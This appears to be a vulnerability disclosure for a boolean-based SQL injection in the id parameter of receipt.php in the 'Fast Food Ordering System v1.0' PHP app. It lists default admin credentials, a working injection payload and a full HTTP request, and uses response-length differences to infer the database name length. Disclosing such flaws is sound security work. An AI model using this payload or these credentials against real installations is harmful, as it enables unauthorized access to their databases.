# Fast Food Ordering System v1.0 by oretnom23 has SQL injection

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/15366/fast-food-ordering-system-phpoop-free-source-code.html

Vulnerability File: /ffos/admin/sales/receipt.php?id=

Vulnerability location: /ffos/admin/sales/receipt.php?id=, id

Current database name: ffos_db,length is 7

[+] Payload: /ffos/admin/sales/receipt.php?id=10%27%20and%20length(database())%20=7--+ // Leak place ---> id


```sql
GET /ffos/admin/sales/receipt.php?id=10%27%20and%20length(database())%20=7--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=rlr2a917ahfp4mc52mm9a7kvvm
Connection: close
```

When length (database ()) = 6, Content-Length: 7417
![image](https://user-images.githubusercontent.com/54017627/171350266-476441b8-4ec7-4484-900e-420385e7b20d.png)

![image](https://user-images.githubusercontent.com/54017627/171350111-3f473473-35be-4f29-a135-f30b044cbb8f.png)

When length (database ()) = 7, Content-Length: 8389
![image](https://user-images.githubusercontent.com/54017627/171350316-85cb4819-06bc-469f-87ea-0259debbe8a2.png)

![image](https://user-images.githubusercontent.com/54017627/171350095-52faa743-321c-4bd3-8669-5652e9333db4.png)
